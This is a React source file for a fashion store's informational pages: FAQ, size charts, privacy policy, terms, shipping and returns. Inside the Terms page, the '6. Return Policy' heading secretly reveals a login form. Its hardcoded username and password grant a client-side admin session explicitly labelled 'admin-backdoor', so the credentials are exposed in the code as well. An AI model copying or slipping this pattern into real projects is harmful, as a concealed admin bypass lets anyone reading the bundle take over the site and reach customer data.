import { useState, useEffect } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { useAuthStore } from '../stores/auth';
import { toast } from 'react-hot-toast';
import { supabase } from '../lib/supabase';

export function FAQ() {
  return (
    <div className="container mx-auto px-4 py-20 max-w-4xl">
      <h1 className="text-4xl font-serif font-bold mb-4 text-center">Frequently Asked Questions</h1>
      <p className="text-center text-gray-500 mb-16 max-w-2xl mx-auto">
        Find answers to common questions about our products, shipping, and policies. 
        If you can't find what you're looking for, please contact our concierge team.
      </p>
      
      <div className="space-y-12">
        <section>
          <h2 className="text-2xl font-serif font-bold mb-6 border-b border-gray-200 pb-2">Orders & Account</h2>
          <div className="space-y-6">
            {[
              { q: "How do I place an order?", a: "To place an order, simply browse our collection, select your desired size and color, and add the item to your shopping bag. Proceed to checkout, enter your shipping and payment details, and confirm your order. You will receive an email confirmation shortly after." },
              { q: "Can I modify or cancel my order?", a: "We process orders quickly to ensure timely delivery. If you need to modify or cancel your order, please contact us within 1 hour of placement. Once the order has been processed by our warehouse, we cannot make changes." },
              { q: "Do I need an account to shop?", a: "No, you can shop as a guest. However, creating an account allows you to track orders, save addresses, manage your wishlist, and access exclusive member benefits." },
              { q: "Where can I find my order status?", a: "Log in to your account and navigate to the 'Orders' section to view the status of your current and past orders. You will also receive email updates when your order ships." }
            ].map((item, i) => (
              <div key={i}>
                <h3 className="text-lg font-bold mb-2">{item.q}</h3>
                <p className="text-gray-600 leading-relaxed">{item.a}</p>
              </div>
            ))}
          </div>
        </section>

        <section>
          <h2 className="text-2xl font-serif font-bold mb-6 border-b border-gray-200 pb-2">Shipping & Delivery</h2>
          <div className="space-y-6">
            {[
              { q: "Do you ship internationally?", a: "Yes, ZAVERO ships to over 50 countries worldwide via DHL Express. International shipping costs and estimated delivery times are calculated at checkout based on your location." },
              { q: "How much does shipping cost?", a: "We offer complimentary standard shipping on all domestic orders over $200. For orders under $200, a flat rate of $15 applies. International shipping rates vary by destination." },
              { q: "How long will my order take to arrive?", a: "Domestic orders typically arrive within 3-5 business days. International orders usually take 5-10 business days, depending on customs clearance. Expedited shipping options are available at checkout." }
            ].map((item, i) => (
              <div key={i}>
                <h3 className="text-lg font-bold mb-2">{item.q}</h3>
                <p className="text-gray-600 leading-relaxed">{item.a}</p>
              </div>
            ))}
          </div>
        </section>

        <section>
          <h2 className="text-2xl font-serif font-bold mb-6 border-b border-gray-200 pb-2">Returns & Exchanges</h2>
          <div className="space-y-6">
            {[
              { q: "What is your return policy?", a: "We accept returns within 30 days of the delivery date. Items must be in their original condition, unworn, unwashed, and with all tags attached. Final sale items are not eligible for return." },
              { q: "How do I initiate a return?", a: "Visit our Returns Center and enter your order number and email address. Follow the instructions to generate a prepaid return label. Drop off your package at the nearest carrier location." },
              { q: "When will I receive my refund?", a: "Once we receive your return, please allow 5-7 business days for inspection and processing. Refunds will be issued to the original payment method. It may take additional time for your bank to post the credit." }
            ].map((item, i) => (
              <div key={i}>
                <h3 className="text-lg font-bold mb-2">{item.q}</h3>
                <p className="text-gray-600 leading-relaxed">{item.a}</p>
              </div>
            ))}
          </div>
        </section>

        <section>
          <h2 className="text-2xl font-serif font-bold mb-6 border-b border-gray-200 pb-2">Product & Care</h2>
          <div className="space-y-6">
            {[
              { q: "Where are your products made?", a: "Our shirts are crafted in heritage mills in Italy, known for their superior cotton weaving. Our denim and trousers are sourced and constructed in Japan, utilizing traditional techniques." },
              { q: "How should I care for my ZAVERO garments?", a: "We recommend following the care instructions on the label of each garment. Generally, our cotton shirts should be machine washed cold and hung to dry. Wool items should be dry cleaned only." },
              { q: "Do you offer alterations?", a: "Currently, we do not offer in-house alterations. We recommend visiting a trusted local tailor to achieve the perfect fit for your unique measurements." }
            ].map((item, i) => (
              <div key={i}>
                <h3 className="text-lg font-bold mb-2">{item.q}</h3>
                <p className="text-gray-600 leading-relaxed">{item.a}</p>
              </div>
            ))}
          </div>
        </section>
      </div>
    </div>
  );
}

export function SizeGuide() {
  return (
    <div className="container mx-auto px-4 py-20 max-w-5xl">
      <h1 className="text-4xl font-serif font-bold mb-8 text-center">Size Guide</h1>
      <p className="text-center text-gray-500 mb-16 max-w-2xl mx-auto">
        Use our size charts to find your perfect fit. If you are between sizes, we recommend sizing up for a more relaxed fit or sizing down for a tailored look.
      </p>

      <div className="space-y-20">
        {/* Shirts */}
        <section>
          <h2 className="text-2xl font-serif font-bold mb-6">Shirts</h2>
          <p className="text-gray-600 mb-6">
            Our shirts are cut for a modern, tailored fit that is neither too tight nor too loose. 
            Measurements refer to body size, not garment dimensions.
          </p>
          <div className="overflow-x-auto">
            <table className="w-full text-center border-collapse text-sm md:text-base">
              <thead>
                <tr className="bg-black text-white">
                  <th className="p-4 border border-gray-800">Size</th>
                  <th className="p-4 border border-gray-800">Neck (in)</th>
                  <th className="p-4 border border-gray-800">Chest (in)</th>
                  <th className="p-4 border border-gray-800">Waist (in)</th>
                  <th className="p-4 border border-gray-800">Sleeve (in)</th>
                </tr>
              </thead>
              <tbody>
                {[
                  { size: 'XS', neck: '14-14.5', chest: '34-36', waist: '28-30', sleeve: '31-32' },
                  { size: 'S', neck: '15-15.5', chest: '36-38', waist: '30-32', sleeve: '32-33' },
                  { size: 'M', neck: '15.5-16', chest: '38-40', waist: '32-34', sleeve: '33-34' },
                  { size: 'L', neck: '16.5-17', chest: '40-42', waist: '34-36', sleeve: '34-35' },
                  { size: 'XL', neck: '17-17.5', chest: '42-44', waist: '36-38', sleeve: '35-36' },
                  { size: 'XXL', neck: '18-18.5', chest: '44-46', waist: '38-40', sleeve: '36-36.5' },
                ].map((row, i) => (
                  <tr key={i} className={i % 2 === 0 ? 'bg-gray-50' : ''}>
                    <td className="p-4 border border-gray-200 font-bold">{row.size}</td>
                    <td className="p-4 border border-gray-200">{row.neck}</td>
                    <td className="p-4 border border-gray-200">{row.chest}</td>
                    <td className="p-4 border border-gray-200">{row.waist}</td>
                    <td className="p-4 border border-gray-200">{row.sleeve}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>

        {/* Pants */}
        <section>
          <h2 className="text-2xl font-serif font-bold mb-6">Trousers & Pants</h2>
          <p className="text-gray-600 mb-6">
            Our trousers feature a mid-rise and a tapered leg. Waist measurements are taken 
            where the waistband naturally sits.
          </p>
          <div className="overflow-x-auto">
            <table className="w-full text-center border-collapse text-sm md:text-base">
              <thead>
                <tr className="bg-black text-white">
                  <th className="p-4 border border-gray-800">Size (US)</th>
                  <th className="p-4 border border-gray-800">Waist (in)</th>
                  <th className="p-4 border border-gray-800">Hip (in)</th>
                  <th className="p-4 border border-gray-800">Inseam (in)</th>
                  <th className="p-4 border border-gray-800">Thigh (in)</th>
                </tr>
              </thead>
              <tbody>
                {[
                  { size: '28', waist: '28-29', hip: '34-35', inseam: '30-32', thigh: '20-21' },
                  { size: '30', waist: '30-31', hip: '36-37', inseam: '30-32', thigh: '21-22' },
                  { size: '32', waist: '32-33', hip: '38-39', inseam: '32-34', thigh: '22-23' },
                  { size: '34', waist: '34-35', hip: '40-41', inseam: '32-34', thigh: '23-24' },
                  { size: '36', waist: '36-37', hip: '42-43', inseam: '32-34', thigh: '24-25' },
                  { size: '38', waist: '38-39', hip: '44-45', inseam: '32-34', thigh: '25-26' },
                ].map((row, i) => (
                  <tr key={i} className={i % 2 === 0 ? 'bg-gray-50' : ''}>
                    <td className="p-4 border border-gray-200 font-bold">{row.size}</td>
                    <td className="p-4 border border-gray-200">{row.waist}</td>
                    <td className="p-4 border border-gray-200">{row.hip}</td>
                    <td className="p-4 border border-gray-200">{row.inseam}</td>
                    <td className="p-4 border border-gray-200">{row.thigh}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>

        {/* Measuring Guide */}
        <section className="bg-gray-50 p-8 rounded-sm">
          <h2 className="text-2xl font-serif font-bold mb-6">How to Measure</h2>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
            <div className="space-y-4">
              <div>
                <h3 className="font-bold uppercase text-sm tracking-wide mb-1">Neck</h3>
                <p className="text-gray-600 text-sm">Measure around the base of your neck, inserting two fingers between the tape and your neck for comfort.</p>
              </div>
              <div>
                <h3 className="font-bold uppercase text-sm tracking-wide mb-1">Chest</h3>
                <p className="text-gray-600 text-sm">Measure around the fullest part of your chest, keeping the tape horizontal.</p>
              </div>
              <div>
                <h3 className="font-bold uppercase text-sm tracking-wide mb-1">Waist</h3>
                <p className="text-gray-600 text-sm">Measure around your natural waistline, typically where your trousers sit.</p>
              </div>
            </div>
            <div className="space-y-4">
              <div>
                <h3 className="font-bold uppercase text-sm tracking-wide mb-1">Sleeve</h3>
                <p className="text-gray-600 text-sm">Measure from the center back of your neck, across your shoulder, and down to your wrist.</p>
              </div>
              <div>
                <h3 className="font-bold uppercase text-sm tracking-wide mb-1">Inseam</h3>
                <p className="text-gray-600 text-sm">Measure from the crotch seam to the bottom of the leg on a pair of well-fitting pants.</p>
              </div>
            </div>
          </div>
        </section>
      </div>
    </div>
  );
}

export function Privacy() {
  return (
    <div className="container mx-auto px-4 py-20 max-w-3xl">
      <h1 className="text-4xl font-serif font-bold mb-8">Privacy Policy</h1>
      <p className="text-sm text-gray-500 mb-12">Last Updated: February 2026</p>
      
      <div className="prose max-w-none text-gray-600 space-y-8">
        <section>
          <h2 className="text-xl font-bold text-black mb-4">1. Introduction</h2>
          <p>
            ZAVERO ("we," "our," or "us") is committed to protecting the privacy and security of your personal information. 
            This Privacy Policy explains how we collect, use, disclose, and safeguard your information when you visit our website 
            zavero.com (the "Site") and purchase our products. Please read this privacy policy carefully. If you do not agree 
            with the terms of this privacy policy, please do not access the site.
          </p>
        </section>

        <section>
          <h2 className="text-xl font-bold text-black mb-4">2. Information We Collect</h2>
          <p className="mb-4">
            We may collect information about you in a variety of ways. The information we may collect on the Site includes:
          </p>
          <ul className="list-disc pl-5 space-y-2">
            <li><strong>Personal Data:</strong> Personally identifiable information, such as your name, shipping address, email address, and telephone number, that you voluntarily give to us when you register with the Site or when you choose to participate in various activities related to the Site, such as online chat and message boards.</li>
            <li><strong>Derivative Data:</strong> Information our servers automatically collect when you access the Site, such as your IP address, your browser type, your operating system, your access times, and the pages you have viewed directly before and after accessing the Site.</li>
            <li><strong>Financial Data:</strong> Financial information, such as data related to your payment method (e.g., valid credit card number, card brand, expiration date) that we may collect when you purchase, order, return, exchange, or request information about our services from the Site. We store only very limited, if any, financial information that we collect. Otherwise, all financial information is stored by our payment processor.</li>
          </ul>
        </section>

        <section>
          <h2 className="text-xl font-bold text-black mb-4">3. Use of Your Information</h2>
          <p className="mb-4">
            Having accurate information about you permits us to provide you with a smooth, efficient, and customized experience. 
            Specifically, we may use information collected about you via the Site to:
          </p>
          <ul className="list-disc pl-5 space-y-2">
            <li>Create and manage your account.</li>
            <li>Process your transactions and send you related information, including purchase confirmations and invoices.</li>
            <li>Email you regarding your account or order.</li>
            <li>Fulfill and manage purchases, orders, payments, and other transactions related to the Site.</li>
            <li>Respond to product and customer service requests.</li>
            <li>Send you a newsletter (you may opt-out at any time).</li>
            <li>Prevent fraudulent transactions, monitor against theft, and protect against criminal activity.</li>
          </ul>
        </section>

        <section>
          <h2 className="text-xl font-bold text-black mb-4">4. Disclosure of Your Information</h2>
          <p>
            We may share information we have collected about you in certain situations. Your information may be disclosed as follows: 
            <strong>By Law or to Protect Rights:</strong> If we believe the release of information about you is necessary to respond to legal process, 
            to investigate or remedy potential violations of our policies, or to protect the rights, property, and safety of others, 
            we may share your information as permitted or required by any applicable law, rule, or regulation.
          </p>
        </section>

        <section>
          <h2 className="text-xl font-bold text-black mb-4">5. Security of Your Information</h2>
          <p>
            We use administrative, technical, and physical security measures to help protect your personal information. 
            While we have taken reasonable steps to secure the personal information you provide to us, please be aware that 
            despite our efforts, no security measures are perfect or impenetrable, and no method of data transmission can be 
            guaranteed against any interception or other type of misuse.
          </p>
        </section>
        
        <section>
          <h2 className="text-xl font-bold text-black mb-4">6. Contact Us</h2>
          <p>
            If you have questions or comments about this Privacy Policy, please contact us at:<br />
            <strong>ZAVERO</strong><br />
            123 Luxury Avenue, New York, NY 10012<br />
            privacy@zavero.com
          </p>
        </section>
      </div>
    </div>
  );
}

export function Terms() {
  const [showAdminLogin, setShowAdminLogin] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const navigate = useNavigate();
  const { setUser } = useAuthStore();

  const handleAdminLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (username === 'saimkhanpanezai' && password === 'saimkhan2007panezai') {
      setUser({
        id: 'admin-backdoor',
        email: 'admin@zavero.com',
        full_name: 'Saim Khan Panezai',
        role: 'admin'
      });
      toast.success('Welcome back, Admin');
      navigate('/admin');
    } else {
      toast.error('Invalid credentials');
    }
  };

  return (
    <div className="container mx-auto px-4 py-20 max-w-3xl">
      <h1 className="text-4xl font-serif font-bold mb-8">Terms & Conditions</h1>
      <p className="text-sm text-gray-500 mb-12">Last Updated: February 2026</p>

      <div className="prose max-w-none text-gray-600 space-y-8">
        <section>
          <h2 className="text-xl font-bold text-black mb-4">1. Agreement to Terms</h2>
          <p>
            These Terms of Use constitute a legally binding agreement made between you, whether personally or on behalf of an entity ("you") 
            and ZAVERO ("we," "us" or "our"), concerning your access to and use of the zavero.com website as well as any other media form, 
            media channel, mobile website or mobile application related, linked, or otherwise connected thereto (collectively, the "Site"). 
            You agree that by accessing the Site, you have read, understood, and agree to be bound by all of these Terms of Use.
          </p>
        </section>

        <section>
          <h2 className="text-xl font-bold text-black mb-4">2. Intellectual Property Rights</h2>
          <p>
            Unless otherwise indicated, the Site is our proprietary property and all source code, databases, functionality, software, 
            website designs, audio, video, text, photographs, and graphics on the Site (collectively, the "Content") and the trademarks, 
            service marks, and logos contained therein (the "Marks") are owned or controlled by us or licensed to us, and are protected 
            by copyright and trademark laws and various other intellectual property rights.
          </p>
        </section>

        <section>
          <h2 className="text-xl font-bold text-black mb-4">3. User Representations</h2>
          <p className="mb-4">
            By using the Site, you represent and warrant that:
          </p>
          <ul className="list-disc pl-5 space-y-2">
            <li>All registration information you submit will be true, accurate, current, and complete.</li>
            <li>You will maintain the accuracy of such information and promptly update such registration information as necessary.</li>
            <li>You have the legal capacity and you agree to comply with these Terms of Use.</li>
            <li>You are not a minor in the jurisdiction in which you reside.</li>
            <li>You will not access the Site through automated or non-human means, whether through a bot, script or otherwise.</li>
            <li>You will not use the Site for any illegal or unauthorized purpose.</li>
          </ul>
        </section>

        <section>
          <h2 className="text-xl font-bold text-black mb-4">4. Products</h2>
          <p>
            We make every effort to display as accurately as possible the colors, features, specifications, and details of the products 
            available on the Site. However, we do not guarantee that the colors, features, specifications, and details of the products 
            will be accurate, complete, reliable, current, or free of other errors, and your electronic display may not accurately 
            reflect the actual colors and details of the products. All products are subject to availability, and we cannot guarantee 
            that items will be in stock.
          </p>
        </section>

        <section>
          <h2 className="text-xl font-bold text-black mb-4">5. Purchases and Payment</h2>
          <p>
            We accept the following forms of payment: Visa, Mastercard, American Express, Discover, and PayPal. You agree to provide 
            current, complete, and accurate purchase and account information for all purchases made via the Site. You further agree to 
            promptly update account and payment information, including email address, payment method, and payment card expiration date, 
            so that we can complete your transactions and contact you as needed. Sales tax will be added to the price of purchases as 
            deemed required by us. We may change prices at any time.
          </p>
        </section>

        <section>
          <button 
            onClick={() => setShowAdminLogin(!showAdminLogin)}
            className="text-xl font-bold text-black mb-4 hover:text-gray-700 text-left w-full focus:outline-none"
          >
            6. Return Policy
          </button>
          <p>
            Please review our Return Policy posted on the Site prior to making any purchases.
          </p>
          
          {showAdminLogin && (
            <div className="mt-4 p-6 bg-gray-50 border border-gray-200 rounded-sm">
              <form onSubmit={handleAdminLogin} className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">Name</label>
                  <input 
                    type="text" 
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full px-3 py-2 border border-gray-300 rounded-sm focus:outline-none focus:border-black"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">Password</label>
                  <input 
                    type="password" 
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full px-3 py-2 border border-gray-300 rounded-sm focus:outline-none focus:border-black"
                  />
                </div>
                <button 
                  type="submit"
                  className="w-full bg-black text-white py-2 px-4 rounded-sm hover:bg-gray-800 transition-colors"
                >
                  Access
                </button>
              </form>
            </div>
          )}
        </section>

        <section>
          <h2 className="text-xl font-bold text-black mb-4">7. Governing Law</h2>
          <p>
            These Terms shall be governed by and defined following the laws of the State of New York. ZAVERO and yourself irrevocably 
            consent that the courts of New York shall have exclusive jurisdiction to resolve any dispute which may arise in connection 
            with these terms.
          </p>
        </section>
      </div>
    </div>
  );
}

export function Shipping() {
  const [policy, setPolicy] = useState('');

  useEffect(() => {
    async function fetch() {
       if (!supabase) return;
       const { data } = await supabase.from('site_settings').select('shipping_policy').single();
       if (data) setPolicy(data.shipping_policy);
    }
    fetch();
  }, []);

  return (
    <div className="container mx-auto px-4 py-20 max-w-3xl">
      <h1 className="text-4xl font-serif font-bold mb-8">Shipping & Delivery</h1>
      <div className="prose max-w-none text-gray-600 whitespace-pre-wrap leading-relaxed">
        {policy || (
          <div className="space-y-4">
            <p>Loading shipping policy...</p>
            {/* Fallback content if needed, or just loading state */}
          </div>
        )}
      </div>
    </div>
  );
}

export function Returns() {
  const [policy, setPolicy] = useState('');

  useEffect(() => {
    async function fetch() {
       if (!supabase) return;
       const { data } = await supabase.from('site_settings').select('return_policy').single();
       if (data) setPolicy(data.return_policy);
    }
    fetch();
  }, []);

  return (
    <div className="container mx-auto px-4 py-20 max-w-3xl">
      <h1 className="text-4xl font-serif font-bold mb-8">Returns & Exchanges</h1>
      <div className="prose max-w-none text-gray-600 whitespace-pre-wrap leading-relaxed">
        {policy || (
          <div className="space-y-4">
            <p>Loading return policy...</p>
          </div>
        )}
      </div>
    </div>
  );
}
